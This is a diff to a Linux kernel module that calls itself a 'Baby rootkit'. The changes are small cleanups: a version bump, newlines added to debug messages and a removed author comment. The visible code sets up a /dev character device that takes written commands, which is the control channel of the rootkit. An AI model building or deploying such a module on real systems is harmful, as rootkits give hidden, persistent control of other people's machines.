@@ -22,12 +22,12 @@ MODULE_INFO(intree, "Y");
 MODULE_AUTHOR("Zach");
 MODULE_LICENSE("GPL v2");
 MODULE_DESCRIPTION("Baby rootkit");
-MODULE_VERSION("0.2");
-
+MODULE_VERSION("0.2.1");
 
 static char* filename = THIS_MODULE->name;
 module_param(filename, charp, 0000);
 MODULE_PARM_DESC(filename, "Filename in /dev");
+
 static char* cmd_ptr;
 static char cmd_str[BUFF_LEN];
 static int major = -1;
@@ -46,6 +46,7 @@ static int device_release(struct inode *, struct file *);
 static ssize_t device_write(struct file *, const char *, size_t, loff_t *);
 static ssize_t device_read(struct file *, char *, size_t, loff_t *);
 
+
 // operations on our /dev/$filename file
 // and their associated functions
 static const struct file_operations file_ops = {
@@ -55,10 +56,11 @@ static const struct file_operations file_ops = {
 	.release = device_release
 };
 
+
 static ssize_t device_read(struct file *filp, char *buffer, size_t length, loff_t *offset)
 {
 	int bytes_read = 0;
-	DEBUG_PRINT("%s: in device_read", THIS_MODULE->name);
+	DEBUG_PRINT("%s: in device_read\n", THIS_MODULE->name);
 	while (length && *status_ptr) {
 		put_user(*(status_ptr++), buffer++);
 		length--;
@@ -70,7 +72,7 @@ static ssize_t device_read(struct file *filp, char *buffer, size_t length, loff_
 
 static void cleanup(int device_created)
 {
-	DEBUG_PRINT("%s in cleanup", THIS_MODULE->name);
+	DEBUG_PRINT("%s: in cleanup\n", THIS_MODULE->name);
 	if (device_created) {
 		device_destroy(myclass, major);
 		cdev_del(&mycdev);
@@ -104,7 +106,7 @@ static void parse_command(char * cmd)
 // Called when a process tries to write to our device 
 static ssize_t device_write(struct file *flip, const char *buffer, size_t len, loff_t *offset)
 {
-	DEBUG_PRINT("%s: in device_write", THIS_MODULE->name);
+	DEBUG_PRINT("%s: in device_write\n", THIS_MODULE->name);
 
 	int i;
 	for (i = 0; i < len && i < BUFF_LEN; i++)
@@ -122,7 +124,7 @@ static ssize_t device_write(struct file *flip, const char *buffer, size_t len, l
 // Called when a process opens our device
 static int device_open(struct inode *inode, struct file *file)
 {
-	DEBUG_PRINT("%s: in device_open", THIS_MODULE->name);
+	DEBUG_PRINT("%s: in device_open\n", THIS_MODULE->name);
 
 	// make sure only one process is using our device
 	if (device_open_count) return -EBUSY;
@@ -190,9 +192,7 @@ static int __init mod_init(void)
 
 	// /proc/devices
 	if (alloc_chrdev_region(&major, 0, 1, filename) < 0) {
-		goto error; // NOTE to anyone reading this: I think "goto"
-		// works well here. If you have a better idea,
-		// I'd like to hear it -- Zach
+		goto error;
 	}
 	// /sys/class
 	if ((myclass = class_create(THIS_MODULE, filename)) == NULL) {
